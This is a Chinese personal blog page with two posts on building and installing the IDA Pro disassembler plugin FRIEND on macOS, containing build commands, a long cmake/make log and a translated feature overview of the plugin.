<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="举眉间仲夏，绿荫里蝉鸣">
<meta property="og:type" content="website">
<meta property="og:title" content="Forest Mist">
<meta property="og:url" content="http://chensh.top/index.html">
<meta property="og:site_name" content="Forest Mist">
<meta property="og:description" content="举眉间仲夏，绿荫里蝉鸣">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Forest Mist">
<meta name="twitter:description" content="举眉间仲夏，绿荫里蝉鸣">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://chensh.top/"/>





  <title>Forest Mist</title>
  














</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Forest Mist</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">时は离れてるても、君の心は近くに感じる</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/09/29/IDA插件FRIEND编译操作实践/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/29/IDA插件FRIEND编译操作实践/" itemprop="url">IDA插件FRIEND编译操作实践</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-29T10:08:48+08:00">
                2017-09-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="FRIEND"><a href="#FRIEND" class="headerlink" title="FRIEND"></a>FRIEND</h1><p>以下安装步骤来源于Git源：<a href="https://github.com/alexhude/FRIEND" target="_blank" rel="external">FRIEND</a></p>
<p>翻译文章请<a href="http://chensh.top/2017/09/06/IDA-Plugin-FRIEND/">查看这里</a></p>
<h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><p>要编译IDA的插件，需要具备以下一些依赖条件：</p>
<ul>
<li>CMake 3.3版本以上</li>
<li>在MacOS或Linux系统上需要GCC或者Clang编译器</li>
<li>IDA SDK（本文基于6.8版本的，可以在<a href="https://pan.baidu.com/s/1sljt7GT" target="_blank" rel="external">这里下载</a>对应的sdk，密码: yekv）</li>
<li>Hex-Rays SDK</li>
</ul>
<h3 id="如何获取-Hex-Rays-SDK"><a href="#如何获取-Hex-Rays-SDK" class="headerlink" title="如何获取 Hex-Rays SDK"></a>如何获取 Hex-Rays SDK</h3><p>在自己的ida应用包里面，可以将该文件夹拷贝出来。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fjxc4vezi7j314k0vgtkk.jpg" alt=""></p>
<h3 id="如何安装CMake"><a href="#如何安装CMake" class="headerlink" title="如何安装CMake"></a>如何安装CMake</h3><p>可以到CMake的<a href="https://cmake.org/download/" target="_blank" rel="external">官网上面</a>下载对应平台的安装包。</p>
<p>安装后，可能在命令行里面依旧会找不到cmake这个命令，这个时候需要添加以下环境变量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PATH=&quot;/Applications/CMake.app/Contents/bin&quot;:&quot;$PATH&quot;</div></pre></td></tr></table></figure>
<p>这个时候cmake命令就可以在终端下使用了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ cmake </div><div class="line">Usage</div><div class="line"></div><div class="line">  cmake [options] &lt;path-to-source&gt;</div><div class="line">  cmake [options] &lt;path-to-existing-build&gt;</div><div class="line"></div><div class="line">Specify a source directory to (re-)generate a build system for it in the</div><div class="line">current working directory.  Specify an existing build directory to</div><div class="line">re-generate its build system.</div><div class="line"></div><div class="line">Run &apos;cmake --help&apos; for more information.</div></pre></td></tr></table></figure>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="克隆工程"><a href="#克隆工程" class="headerlink" title="克隆工程"></a>克隆工程</h3><p>将工程克隆到本地文件夹中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/alexhude/FRIEND.git</div></pre></td></tr></table></figure>
<h3 id="创建编译文件夹"><a href="#创建编译文件夹" class="headerlink" title="创建编译文件夹"></a>创建编译文件夹</h3><p>进入刚刚克隆下来的远程仓库，创建一个<strong>build</strong>文件夹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ mkdir _build</div><div class="line">$ cd _build</div></pre></td></tr></table></figure>
<p>这里我们用的是IDA6.8版本，所以需要增加一个编译选项 <strong>DUSE_IDA6_SDK</strong>，指定是否为6.X的版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cmake -DUSE_IDA6_SDK=ON ..</div></pre></td></tr></table></figure>
<p>得到以下结果：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fjxce5vbhmj317m0oojy9.jpg" alt=""></p>
<p>cmake会帮我们创建好相应的makefile。</p>
<h3 id="拷贝SDK文件夹"><a href="#拷贝SDK文件夹" class="headerlink" title="拷贝SDK文件夹"></a>拷贝SDK文件夹</h3><p>将我们上面下载的<strong>IDA SDK6.8</strong>文件夹和<strong>Hex-Rays SDK</strong>文件夹拷贝到<strong>FRIEND</strong>文件夹目录下，替换原有的文件夹，效果如图：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fjxcl0xvthj30bu0fk0tr.jpg" alt=""></p>
<h3 id="开始编译插件"><a href="#开始编译插件" class="headerlink" title="开始编译插件"></a>开始编译插件</h3><p>之后我们就可以运行命令开始编译插件了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make</div></pre></td></tr></table></figure>
<p>编译结果如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line">Scanning dependencies of target capstone</div><div class="line">[  3%] Creating directories for &apos;capstone&apos;</div><div class="line">[  6%] Performing download step (git clone) for &apos;capstone&apos;</div><div class="line">Cloning into &apos;capstone&apos;...</div><div class="line">Already on &apos;master&apos;</div><div class="line">Your branch is up-to-date with &apos;origin/master&apos;.</div><div class="line">[ 10%] Performing patch step for &apos;capstone&apos;</div><div class="line">HEAD is now at a279481d Fix pp field in readPrefix for VEX3 and EVEX (#1015) (#1016)</div><div class="line">[ 13%] Performing update step for &apos;capstone&apos;</div><div class="line">Current branch master is up to date.</div><div class="line">[ 16%] Performing configure step for &apos;capstone&apos;</div><div class="line">-- The C compiler identification is AppleClang 8.1.0.8020042</div><div class="line">-- The CXX compiler identification is AppleClang 8.1.0.8020042</div><div class="line">-- Check for working C compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/cc</div><div class="line">-- Check for working C compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/cc -- works</div><div class="line">-- Detecting C compiler ABI info</div><div class="line">-- Detecting C compiler ABI info - done</div><div class="line">-- Detecting C compile features</div><div class="line">-- Detecting C compile features - done</div><div class="line">-- Check for working CXX compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++</div><div class="line">-- Check for working CXX compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -- works</div><div class="line">-- Detecting CXX compiler ABI info</div><div class="line">-- Detecting CXX compiler ABI info - done</div><div class="line">-- Detecting CXX compile features</div><div class="line">-- Detecting CXX compile features - done</div><div class="line">-- Configuring done</div><div class="line">-- Generating done</div><div class="line">CMake Warning:</div><div class="line">  Manually-specified variables were not used by the project:</div><div class="line"></div><div class="line">    CMAKE_CXX_FLAGS_DEBUG</div><div class="line">    CMAKE_CXX_FLAGS_MINSIZEREL</div><div class="line">    CMAKE_CXX_FLAGS_RELEASE</div><div class="line">    CMAKE_CXX_FLAGS_RELWITHDEBINFO</div><div class="line">    CMAKE_C_FLAGS_DEBUG</div><div class="line">    CMAKE_C_FLAGS_MINSIZEREL</div><div class="line">    CMAKE_C_FLAGS_RELEASE</div><div class="line">    CMAKE_C_FLAGS_RELWITHDEBINFO</div><div class="line"></div><div class="line"></div><div class="line">-- Build files have been written to: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/src/capstone-build</div><div class="line">[ 20%] Performing build step for &apos;capstone&apos;</div><div class="line">Scanning dependencies of target capstone-static</div><div class="line">[  6%] Building C object CMakeFiles/capstone-static.dir/cs.c.o</div><div class="line">[ 12%] Building C object CMakeFiles/capstone-static.dir/MCInst.c.o</div><div class="line">[ 18%] Building C object CMakeFiles/capstone-static.dir/MCInstrDesc.c.o</div><div class="line">[ 25%] Building C object CMakeFiles/capstone-static.dir/MCRegisterInfo.c.o</div><div class="line">[ 31%] Building C object CMakeFiles/capstone-static.dir/SStream.c.o</div><div class="line">[ 37%] Building C object CMakeFiles/capstone-static.dir/utils.c.o</div><div class="line">[ 43%] Building C object CMakeFiles/capstone-static.dir/arch/ARM/ARMDisassembler.c.o</div><div class="line">[ 50%] Building C object CMakeFiles/capstone-static.dir/arch/ARM/ARMInstPrinter.c.o</div><div class="line">[ 56%] Building C object CMakeFiles/capstone-static.dir/arch/ARM/ARMMapping.c.o</div><div class="line">[ 62%] Building C object CMakeFiles/capstone-static.dir/arch/ARM/ARMModule.c.o</div><div class="line">[ 68%] Building C object CMakeFiles/capstone-static.dir/arch/AArch64/AArch64BaseInfo.c.o</div><div class="line">[ 75%] Building C object CMakeFiles/capstone-static.dir/arch/AArch64/AArch64Disassembler.c.o</div><div class="line">[ 81%] Building C object CMakeFiles/capstone-static.dir/arch/AArch64/AArch64InstPrinter.c.o</div><div class="line">[ 87%] Building C object CMakeFiles/capstone-static.dir/arch/AArch64/AArch64Mapping.c.o</div><div class="line">[ 93%] Building C object CMakeFiles/capstone-static.dir/arch/AArch64/AArch64Module.c.o</div><div class="line">[100%] Linking C static library libcapstone.a</div><div class="line">[100%] Built target capstone-static</div><div class="line">[ 23%] Performing install step for &apos;capstone&apos;</div><div class="line">[100%] Built target capstone-static</div><div class="line">Install the project...</div><div class="line">-- Install configuration: &quot;&quot;</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/arm64.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/arm.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/capstone.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/mips.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/ppc.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/x86.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/sparc.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/systemz.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/xcore.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/include/capstone/platform.h</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/capstone/lib/libcapstone.a</div><div class="line">[ 26%] Completed &apos;capstone&apos;</div><div class="line">[ 26%] Built target capstone</div><div class="line">Scanning dependencies of target pugixml</div><div class="line">[ 30%] Creating directories for &apos;pugixml&apos;</div><div class="line">[ 33%] Performing download step (git clone) for &apos;pugixml&apos;</div><div class="line">Cloning into &apos;pugixml&apos;...</div><div class="line">error: RPC failed; curl 56 SSLRead() return error -9806</div><div class="line">fatal: The remote end hung up unexpectedly</div><div class="line">fatal: early EOF</div><div class="line">fatal: index-pack failed</div><div class="line">Cloning into &apos;pugixml&apos;...</div><div class="line">-- Had to git clone more than once:</div><div class="line">          2 times.</div><div class="line">Already on &apos;master&apos;</div><div class="line">Your branch is up-to-date with &apos;origin/master&apos;.</div><div class="line">[ 36%] No patch step for &apos;pugixml&apos;</div><div class="line">[ 40%] Performing update step for &apos;pugixml&apos;</div><div class="line">Current branch master is up to date.</div><div class="line">[ 43%] Performing configure step for &apos;pugixml&apos;</div><div class="line">-- The C compiler identification is AppleClang 8.1.0.8020042</div><div class="line">-- The CXX compiler identification is AppleClang 8.1.0.8020042</div><div class="line">-- Check for working C compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/cc</div><div class="line">-- Check for working C compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/cc -- works</div><div class="line">-- Detecting C compiler ABI info</div><div class="line">-- Detecting C compiler ABI info - done</div><div class="line">-- Detecting C compile features</div><div class="line">-- Detecting C compile features - done</div><div class="line">-- Check for working CXX compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++</div><div class="line">-- Check for working CXX compiler: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -- works</div><div class="line">-- Detecting CXX compiler ABI info</div><div class="line">-- Detecting CXX compiler ABI info - done</div><div class="line">-- Detecting CXX compile features</div><div class="line">-- Detecting CXX compile features - done</div><div class="line">-- Configuring done</div><div class="line">-- Generating done</div><div class="line">CMake Warning:</div><div class="line">  Manually-specified variables were not used by the project:</div><div class="line"></div><div class="line">    CMAKE_CXX_FLAGS_DEBUG</div><div class="line">    CMAKE_CXX_FLAGS_MINSIZEREL</div><div class="line">    CMAKE_CXX_FLAGS_RELEASE</div><div class="line">    CMAKE_CXX_FLAGS_RELWITHDEBINFO</div><div class="line">    CMAKE_C_FLAGS_DEBUG</div><div class="line">    CMAKE_C_FLAGS_MINSIZEREL</div><div class="line">    CMAKE_C_FLAGS_RELEASE</div><div class="line">    CMAKE_C_FLAGS_RELWITHDEBINFO</div><div class="line"></div><div class="line"></div><div class="line">-- Build files have been written to: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/src/pugixml-build</div><div class="line">[ 46%] Performing build step for &apos;pugixml&apos;</div><div class="line">Scanning dependencies of target pugixml</div><div class="line">[ 50%] Building CXX object CMakeFiles/pugixml.dir/src/pugixml.cpp.o</div><div class="line">[100%] Linking CXX static library libpugixml.a</div><div class="line">[100%] Built target pugixml</div><div class="line">[ 50%] Performing install step for &apos;pugixml&apos;</div><div class="line">[100%] Built target pugixml</div><div class="line">Install the project...</div><div class="line">-- Install configuration: &quot;&quot;</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/lib/libpugixml.a</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/include/pugixml.hpp</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/include/pugiconfig.hpp</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/lib/cmake/pugixml/pugixml-config.cmake</div><div class="line">-- Installing: /Users/chensh/myDoc/workSpace/FRIEND/_build/third_party/pugixml/lib/cmake/pugixml/pugixml-config-noconfig.cmake</div><div class="line">[ 53%] Completed &apos;pugixml&apos;</div><div class="line">[ 53%] Built target pugixml</div><div class="line">Scanning dependencies of target FRIEND.pmc64</div><div class="line">[ 56%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/AArch64Extender.cpp.o</div><div class="line">[ 60%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/AArch32Extender.cpp.o</div><div class="line">[ 63%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/Documentation.cpp.o</div><div class="line">[ 66%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/FRIEND.cpp.o</div><div class="line">[ 70%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/FunctionSummary.cpp.o</div><div class="line">[ 73%] Building CXX object CMakeFiles/FRIEND.pmc64.dir/FRIEND/Settings.cpp.o</div><div class="line">[ 76%] Linking CXX shared module FRIEND.pmc64</div><div class="line">[ 76%] Built target FRIEND.pmc64</div><div class="line">Scanning dependencies of target FRIEND.pmc</div><div class="line">[ 80%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/AArch64Extender.cpp.o</div><div class="line">[ 83%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/AArch32Extender.cpp.o</div><div class="line">[ 86%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/Documentation.cpp.o</div><div class="line">[ 90%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/FRIEND.cpp.o</div><div class="line">[ 93%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/FunctionSummary.cpp.o</div><div class="line">[ 96%] Building CXX object CMakeFiles/FRIEND.pmc.dir/FRIEND/Settings.cpp.o</div><div class="line">[100%] Linking CXX shared module FRIEND.pmc</div><div class="line">[100%] Built target FRIEND.pmc</div></pre></td></tr></table></figure>
<p>上面的编译过程，首先会下载两个第三方的库，一个是<strong>capstone</strong><br>,一个是 <strong>pugixml</strong>。<br>然后开始编译目标二进制，最重得到我们需要的插件文件:</p>
<p><strong>FRIEND.pmc</strong>和<strong>FRIEND.pmc64</strong></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fjxcpaxyc8j30mw0dm0ui.jpg" alt=""></p>
<h3 id="拷贝插件"><a href="#拷贝插件" class="headerlink" title="拷贝插件"></a>拷贝插件</h3><p>将生成的两个文件，拷贝到应用的插件目录下，然后重启idaq应用程序。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fjxcqsn8azj31240ouk0y.jpg" alt=""></p>
<p>重启进入应用，我们随便打开一个二进制文件，然后就可以在Editor菜单项下的plugin看到我们新安装的插件：</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fjxcryinh4j30vo0x018w.jpg" alt=""></p>
<h3 id="加载XML"><a href="#加载XML" class="headerlink" title="加载XML"></a>加载XML</h3><p>在我们克隆的项目工程，里面有个文件夹<strong>Configurations</strong>，存放了一些xml文件。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fjxcujtjobj30n60esq4h.jpg" alt=""></p>
<p>我们首次使用FRIEND的时候，需要加载一些xml配置，来显示对应的高亮关键词。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fjxcsg7vn6j30x40sm40u.jpg" alt=""></p>
<h3 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h3><p>配置好后，当我们鼠标定位到一些关键词后，我们就可以看到效果了。</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fjxcsjzn8qj31120oqqbo.jpg" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/09/06/IDA-Plugin-FRIEND/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/06/IDA-Plugin-FRIEND/" itemprop="url">IDA Plugin: FRIEND</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-06T00:00:26+08:00">
                2017-09-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="FRIEND"><a href="#FRIEND" class="headerlink" title="FRIEND"></a>FRIEND</h1><p>一个灵活查看寄存器和指令的文档扩展工具。</p>
<p><strong>原文地址：</strong> <a href="https://github.com/alexhude/FRIEND" target="_blank" rel="external">FRIEND</a></p>
<p><strong>翻译：</strong> Chensh</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>FRIEND是一个IDA插件，用于改善反汇编以及在IDA视图里面展示寄存器和指令文档。</p>
<ol>
<li>使用第三方库来改进处理器模块。（例如Capstone）<br><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fj7jnfyw32j310v0dvq6g.jpg" alt=""></li>
</ol>
<ol>
<li><p>再IDA视图和反汇编视图里，对指令和寄存器进行提示。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fj7jphlxu4j319514ltlf.jpg" alt=""></p>
</li>
<li><p>在浏览器中显示高亮选项的扩展引用。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fj7jrby7a9j31kw0mv128.jpg" alt=""></p>
</li>
<li><p>在IDA视图和反汇编视图里显示函数功能摘要。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fj7jtk62wej31kw0wi15v.jpg" alt=""></p>
</li>
<li><p>可以选择你感兴趣的元素进行展示。<br><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fj7ju6xpykj313k0ywjx4.jpg" alt=""></p>
</li>
</ol>
<h2 id="如何编译"><a href="#如何编译" class="headerlink" title="如何编译"></a>如何编译</h2><h3 id="准备编译环境"><a href="#准备编译环境" class="headerlink" title="准备编译环境"></a>准备编译环境</h3><p>想要编译IDA插件，需要满足以下的依赖：</p>
<ul>
<li>CMake 版本为3.3或更高。</li>
<li>再Linux或者MacOS上面使用GCC或者Clang；Windows上面使用Visual Studio 2015。</li>
<li>Git。</li>
<li>IDA SDK（解压为<code>idasdk</code>）</li>
<li>Hex-Rays SDK（拷贝并重命名为 <code>hexrays_sdk</code>）</li>
</ul>
<p>将IDA SDK的内容解压到<code>idasdk</code>文件夹内。并将Hex-Rays SDK拷贝并重命名为<code>hexrays_sdk</code>。在Linux或MacOS上面，你可以使用以下命令操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ unzip /path/to/idasdk69.zip -d idasdk</div><div class="line">$ mv idasdk/idasdk69/* idasdk</div><div class="line">$ rm -r idasdk/idasdk69</div><div class="line">$ cp -r /path/to/ida/plugins/hexrays_sdk hexrays_sdk</div></pre></td></tr></table></figure>
